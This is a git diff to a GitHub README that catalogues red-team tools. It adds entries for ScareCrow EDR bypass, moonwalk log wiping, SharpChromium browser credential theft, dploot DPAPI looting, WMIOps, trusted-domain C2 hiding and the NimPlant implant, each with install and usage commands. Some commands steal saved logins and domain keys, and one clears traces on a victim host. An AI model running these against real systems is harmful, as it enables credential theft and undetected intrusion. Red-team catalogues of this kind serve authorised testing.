@@ -4,7 +4,7 @@
 <img src="https://user-images.githubusercontent.com/100603074/210680426-20a92131-56f9-43ad-be82-f449e3215dda.png" height="300">
 </p>
 
-This github repository contains a collection of **120+** **tools** and **resources** that can be useful for **red teaming activities**. 
+This github repository contains a collection of **125+** **tools** and **resources** that can be useful for **red teaming activities**. 
 
 Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.
 
@@ -142,16 +142,16 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#linux-smart-enumeration">linux-smart-enumeration</a></b><i> Linux privilege escalation</i></li>
             <li><b><a href="#certify">Certify</a></b><i> Active directory privilege escalation</i></li>
             <li><b><a href="#get-gpppassword">Get-GPPPassword</a></b><i> Windows password extraction</i></li>
-	    <li><b><a href="#sherlock">Sherlock</a></b><i> PowerShell privilege escalation tool</i></li>
-	    <li><b><a href="#watson">Watson</a></b><i> Windows privilege escalation tool</i></li>
-	    <li><b><a href="#impulsivedllhijack">ImpulsiveDLLHijack</a></b><i> DLL Hijack tool</i></li>
-	    <li><b><a href="#adfsdump">ADFSDump</a></b><i> AD FS dump tool</i></li>
+            <li><b><a href="#sherlock">Sherlock</a></b><i> PowerShell privilege escalation tool</i></li>
+            <li><b><a href="#watson">Watson</a></b><i> Windows privilege escalation tool</i></li>
+            <li><b><a href="#impulsivedllhijack">ImpulsiveDLLHijack</a></b><i> DLL Hijack tool</i></li>
+            <li><b><a href="#adfsdump">ADFSDump</a></b><i> AD FS dump tool</i></li>
         </ul>
     </ul>
 </details>
 
 <details open>
-    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{5 tools}}$</summary>
+    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{8 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#invoke-obfuscation">Invoke-Obfuscation</a></b><i> Script obfuscator</i></li>
@@ -160,12 +160,14 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#alcatraz">Alcatraz</a></b><i> GUI x64 binary obfuscator</i></li>
             <li><b><a href="#mangle">Mangle</a></b><i> Compiled executable manipulation</i></li>
             <li><b><a href="#amsi-fail">AMSI Fail</a></b><i> PowerShell snippets that break or disable AMSI</i></li>
+            <li><b><a href="#scarecrow">ScareCrow</a></b><i> Payload creation framework designed around EDR bypass</i></li>
+            <li><b><a href="#moonwalk">moonwalk</a></b><i> Linux system log and filesystem timestamp remover</i></li>
         </ul>
     </ul>
 </details>
 
 <details open>
-    <summary><b>Credential Access</b> $\textcolor{gray}{\text{9 tools}}$</summary>
+    <summary><b>Credential Access</b> $\textcolor{gray}{\text{11 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#mimikatz">Mimikatz</a></b><i> Windows credential extractor</i></li>
@@ -177,6 +179,8 @@ Some of the tools may be specifically designed for red teaming, while others are
 	        <li><b><a href="#eviltree">eviltree</a></b><i> Tree remake for credential discovery</i></li>
 	        <li><b><a href="#seeyoucm-thief">SeeYouCM-Thief</a></b><i> Cisco phone systems configuration file parsing</i></li>
             <li><b><a href="#mailsniper">MailSniper</a></b><i> Microsoft Exchange Mail Searcher</i></li>
+            <li><b><a href="#sharpchromium">SharpChromium</a></b><i> Cookie, history and saved login chromium extractor</i></li>
+            <li><b><a href="#dploot">dploot</a></b><i> DPAPI looting remotely in Python</i></li>
         </ul>
     </ul>
 </details>
@@ -211,6 +215,7 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#adfspoof">ADFSpoof</a></b><i> Forge AD FS security tokens</i></li>
             <li><b><a href="#kerbrute">kerbrute</a></b><i> A tool to perform Kerberos pre-auth bruteforcing</i></li>
             <li><b><a href="#coercer">Coercer</a></b><i> Coerce a Windows server to authenticate</i></li>
+            <li><b><a href="#wmiops">WMIOps</a></b><i> WMI remote commands</i></li>
         </ul>
     </ul>
 </details>
@@ -227,15 +232,17 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Command and Control</b> $\textcolor{gray}{\text{6 tools}}$</summary>
+    <summary><b>Command and Control</b> $\textcolor{gray}{\text{8 tools}}$</summary>
     <ul>
         <ul>
+            <li><b><a href="#living-off-trusted-sites-project">Living Off Trusted Sites Project</a></b><i> Leverage legitimate domains for your C2</i></li>
             <li><b><a href="#havoc">Havoc</a></b><i> Command and control framework</i></li>
     	    <li><b><a href="#covenant">Covenant</a></b><i> Command and control framework (.NET)</i></li>
     	    <li><b><a href="#merlin">Merlin</a></b><i> Command and control framework (Golang)</i></li>
     	    <li><b><a href="#metasploit-framework">Metasploit Framework</a></b><i> Command and control framework (Ruby)</i></li>
     	    <li><b><a href="#pupy">Pupy</a></b><i> Command and control framework (Python)</i></li>
     	    <li><b><a href="#brute-ratel">Brute Ratel</a></b><i> Command and control framework ($$$)</i></li>
+            <li><b><a href="#nimplant">NimPlant</a></b><i> C2 implant written in Nim</i></li>
         </ul>
     </ul>
 </details>
@@ -2447,6 +2454,99 @@ Nice f-secure blog explaining AMSI [here](https://blog.f-secure.com/hunting-for-
 
 *Image used from http://amsi.fail/*
 
+### [🔙](#tool-list)[ScareCrow](https://github.com/optiv/ScareCrow)
+
+ScareCrow is a payload creation framework for side loading (not injecting) into a legitimate Windows process (bypassing Application Whitelisting controls). 
+
+Once the DLL loader is loaded into memory, it utilizes a technique to flush an EDR’s hook out of the system DLLs running in the process's memory.
+
+When executed, ScareCrow will copy the bytes of the system DLLs stored on disk in `C:\Windows\System32\`. These DLLs are stored on disk “clean” of EDR hooks because they are used by the system to load an unaltered copy into a new process when it’s spawned. Since EDR’s only hook these processes in memory, they remain unaltered.
+
+Nice blogs for learning about techniques utilized by ScareCrow:
+
+- [Endpoint Detection and Response: How Hackers Have Evolved](https://www.optiv.com/explore-optiv-insights/source-zero/endpoint-detection-and-response-how-hackers-have-evolved)
+- [EDR and Blending In: How Attackers Avoid Getting Caught](https://www.optiv.com/explore-optiv-insights/source-zero/edr-and-blending-how-attackers-avoid-getting-caught)
+
+**Install:** 
+
+*ScareCrow requires golang 1.16.1 or later to compile loaders.*
+
+```bash
+# Clone
+git clone https://github.com/optiv/ScareCrow
+cd ScareCrow
+
+# Install dependencies
+go get github.com/fatih/color
+go get github.com/yeka/zip
+go get github.com/josephspurrier/goversioninfo
+
+# Required
+openssl
+osslsigncode
+mingw-w64
+
+# Build
+go build ScareCrow.go
+```
+
+**Usage:** 
+
+```
+Usage of ./ScareCrow:
+  -I string
+        Path to the raw 64-bit shellcode.
+  -Loader string
+        Sets the type of process that will sideload the malicious payload:
+        [*] binary - Generates a binary based payload. (This type does not benefit from any sideloading)
+        [*] control - Loads a hidden control applet - the process name would be rundll32 if -O is specified a JScript loader will be generated.
+        [*] dll - Generates just a DLL file. Can be executed with commands such as rundll32 or regsvr32 with DllRegisterServer, DllGetClassObject as export functions.
+        [*] excel - Loads into a hidden Excel process using a JScript loader.
+        [*] msiexec - Loads into MSIexec process using a JScript loader.
+        [*] wscript - Loads into WScript process using a JScript loader. (default "binary")
+  -O string
+        Name of output file (e.g. loader.js or loader.hta). If Loader is set to dll or binary this option is not required.
+  -configfile string
+        The path to a json based configuration file to generate custom file attributes. This will not use the default ones.
+  -console
+        Only for Binary Payloads - Generates verbose console information when the payload is executed. This will disable the hidden window feature.
+...
+```
+
+Full usage information can be found [here](https://github.com/optiv/ScareCrow#loader).
+
+![image](https://user-images.githubusercontent.com/100603074/220959052-029eac69-0b38-40d5-bc1a-7e90b0c93726.png)
+
+*Image used from https://github.com/optiv/ScareCrow*
+
+### [🔙](#tool-list)[moonwalk](https://github.com/mufeedvh/moonwalk)
+
+moonwalk is a 400 KB single-binary executable that can clear your traces while penetration testing a Unix machine. 
+
+It saves the state of system logs pre-exploitation and reverts that state including the filesystem timestamps post-exploitation leaving zero traces of a ghost in the shell.
+
+**Install:** 
+
+```bash
+curl -L https://github.com/mufeedvh/moonwalk/releases/download/v1.0.0/moonwalk_linux -o moonwalk
+```
+
+**Usage:** 
+
+```bash
+# Start moonwalk straight after getting a shell on the victim Linux endpoint
+curl -L https://github.com/mufeedvh/moonwalk/releases/download/v1.0.0/moonwalk_linux -o moonwalk
+chmod +x moonwalk
+moonwalk start
+
+# Once you are finished, clear your traces 
+moonwalk finish
+```
+
+![image](https://user-images.githubusercontent.com/100603074/220959174-9c72922f-40cc-4843-bdc8-353cc55a3c51.png)
+
+*Image used from https://github.com/mufeedvh/moonwalk*
+
 Credential Access
 ====================
 
@@ -2718,6 +2818,79 @@ Invoke-SelfSearch -Mailbox current-user@domain.com
 ![image](https://user-images.githubusercontent.com/100603074/217654320-3d74551c-e37a-4398-b354-a1ed7f982cd0.png)
 
 *Image used from https://patrowl.io/*
+
+### [🔙](#tool-list)[SharpChromium](https://github.com/djhohnstein/SharpChromium)
+
+SharpChromium is a .NET 4.0+ CLR project to retrieve data from Google Chrome, Microsoft Edge, and Microsoft Edge Beta. Currently, it can extract:
+
+- Cookies (in JSON format)
+- History (with associated cookies for each history item)
+- Saved Logins
+
+This rewrite has several advantages to previous implementations, which include:
+
+- No Type compilation or reflection required
+- Cookies are displayed in JSON format, for easy importing into Cookie Editor.
+- No downloading SQLite assemblies from remote resources.
+- Supports major Chromium browsers (but extendable to others)
+
+**Install:** 
+
+Using [Visual Studio Community Edition](https://visualstudio.microsoft.com/downloads/).
+
+Open up the project .sln, choose "release", and build.
+
+**Usage:** 
+
+```bash
+# Retrieve cookies associated with Google Docs and Github
+.\SharpChromium.exe cookies docs.google.com github.com
+
+# Retrieve history items and their associated cookies.
+.\SharpChromium.exe history
+
+# Retrieve saved logins (Note: Only displays those with non-empty passwords):
+.\SharpChromium.exe logins
+```
+
+![image](https://user-images.githubusercontent.com/100603074/220959335-6e7a8275-bad9-4c3f-883f-2d7ab6749b75.png)
+
+*Image used from https://github.com/djhohnstein/SharpChromium*
+
+### [🔙](#tool-list)[dploot]([dploot](https://github.com/zblurx/dploot))
+
+DPAPI (Data Protection Application Programming Interface) provides a set of APIs to encrypt and decrypt data where a user password is typically used to set the 'master key' (in a user scenario). So to leverage DPAPI to gain access to certain data (Chrome Cookies/Login Data, the Windows Credential Manager/Vault etc) we just need access to a password.
+
+dploot is Python rewrite of SharpDPAPI written un C# by Harmj0y, which is itself a port of DPAPI from Mimikatz by gentilkiwi. It implements all the DPAPI logic of these tools, but this time it is usable with a python interpreter and from a Linux environment.
+
+[Blog - Operational Guidance for Offensive User DPAPI Abuse](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107)
+
+**Install: (Pip)** 
+
+```bash
+pip install dploot
+```
+
+**Install: (Git)** 
+
+```bash
+git clone https://github.com/zblurx/dploot.git
+cd dploot
+make
+```
+
+**Usage:** 
+
+```bash
+# Loot decrypted machine private key files as a Windows local administrator 
+dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -quiet
+
+# Loot the DPAPI backup key as a Windows Domain Administrator (Will allow attacker to loot and decrypt any DPAPI protected password realted to a domain user)
+dploot backupkey -d waza.local -u Administrator -p 'Password!123' 192.168.56.112 -quiet
+
+# Leverage the DPAPI backup key `key.pvk` to loot any user secrets stored on Windows domain joined endpoints
+dploot certificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -pvk key.pvk  -quiet 
+```
 
 Discovery
 ====================
@@ -3356,6 +3529,32 @@ Full usage information [here](https://github.com/lefayjey/linWinPwn#usage).
 Command and Control
 ====================
 
+### [🔙](#tool-list)[Living Off Trusted Sites Project](https://lots-project.com/)
+
+C2 implants can be detected by defenders looking for unusual network traffic to uncommon domains. Additionally proxy solutions can sometimes block connections to untrusted domains.
+
+Being able to hide your C2 traffic via a trusted domain will help you to stay undetected and reduce the likelihood of being blocked at the proxy level by security solutions.
+
+This resource contains a list of trusted sites that can be used. 
+
+**Usage:** 
+
+Visit [https://lots-project.com/](https://lots-project.com/)
+
+Search for `+C&C` in the search bar to view all potential domains / subdomains that can be used for command and control operations.
+
+Results include:
+
+- raw.githubusercontent.com
+- docs.google.com
+- *.azurewebsites.net
+- dropbox.com
+- *.amazonaws.com
+
+![image](https://user-images.githubusercontent.com/100603074/220959716-85a7f403-95af-441b-9cbf-f6c278be6652.png)
+
+*Image used from https://lots-project.com/*
+
 ### [🔙](#tool-list)[Havoc](https://github.com/HavocFramework/Havoc)
 
 Havoc is a modern and malleable post-exploitation command and control framework, created by [@C5pider](https://twitter.com/C5pider).
@@ -3634,6 +3833,51 @@ Full commander terminal usage information can be found [here](https://bruteratel
 ![image](https://user-images.githubusercontent.com/100603074/210181655-74201cad-a782-43ed-97d3-f4c0926d46c3.png)
 
 *Image used from https://bruteratel.com/*
+
+### [🔙](#tool-list)[NimPlant](https://github.com/chvancooten/NimPlant)
+
+A light-weight first-stage C2 implant written in Nim.
+
+Features:
+
+- Lightweight and configurable implant written in the Nim programming language
+- Encryption and compression of all traffic by default, obfuscates static strings in implant artefacts
+- Support for several implant types, including native binaries (exe/dll), shellcode or self-deleting executables
+- Easy deployment of more advanced functionality or payloads via `inline-execute`, `shinject` (using dynamic invocation), or in-thread `execute-assembly`
+- Comprehensive logging of all interactions and file operations
+
+
+**Install:** 
+
+```bash
+curl https://nim-lang.org/choosenim/init.sh -sSf | sh
+choosenim stable
+git clone https://github.com/chvancooten/NimPlant
+cd client
+nimble install -d
+pip3 install -r server/requirements.txt
+apt install mingw-w64
+```
+
+**Usage:** 
+
+```bash
+# Generate payloads
+python .\NimPlant.py compile all
+
+# Start server
+python .\NimPlant.py server 
+```
+
+Before running make sure to create the `config.tool` configuration file, more information can be found [here](https://github.com/chvancooten/NimPlant#getting-started).
+
+Full usage information can be found [here](https://github.com/chvancooten/NimPlant#usage).
+
+[Blog - Building a C2 Implant in Nim - Considerations and Lessons Learned](https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/)
+
+![image](https://user-images.githubusercontent.com/100603074/220959859-d930b110-c774-4b4c-b004-e4a85a6214ba.png)
+
+*Image used from https://casvancooten.com*
 
 Exfiltration
 ====================
